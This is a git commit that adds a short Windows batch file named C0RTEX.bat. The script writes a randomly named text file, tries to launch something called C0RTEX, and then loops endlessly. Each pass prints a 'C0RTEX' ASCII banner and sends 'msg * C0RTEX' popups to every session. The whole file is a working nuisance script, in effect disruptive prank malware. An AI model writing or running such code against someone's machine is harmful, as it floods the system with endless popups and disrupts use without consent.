034e87506c501590a9a75915fbfa4840ebb895c6
starkodder <74370377+starkodder@users.noreply.github.com>
2022-08-18 15:35:07 +0200

    Add files via upload

---
+++ C0RTEX.bat
@@ -0,0 +1,17 @@
+@echo off
+title C0RTEX
+color 0c
+set /A "slump"=%RANDOM% > nul
+echo %slump% > %slump%.txt
+start /max C0RTEX
+:a
+echo  .o88b.  .d88b.  d8888b. d888888b d88888b db    db
+echo d8P  Y8 .8P  88. 88  `8D `~~88~~' 88'     `8b  d8'
+echo 8P      88  d'88 88oobY'    88    88ooooo  `8bd8'
+echo 8b      88 d' 88 88`8b      88    88~~~~~  .dPYb.
+echo Y8b  d8 `88  d8' 88 `88.    88    88.     .8P  Y8.
+echo  `Y88P'  `Y88P'  88   YD    YP    Y88888P YP    YP
+msg * C0RTEX
+msg * C0RTEX
+msg * C0RTEX
+goto a
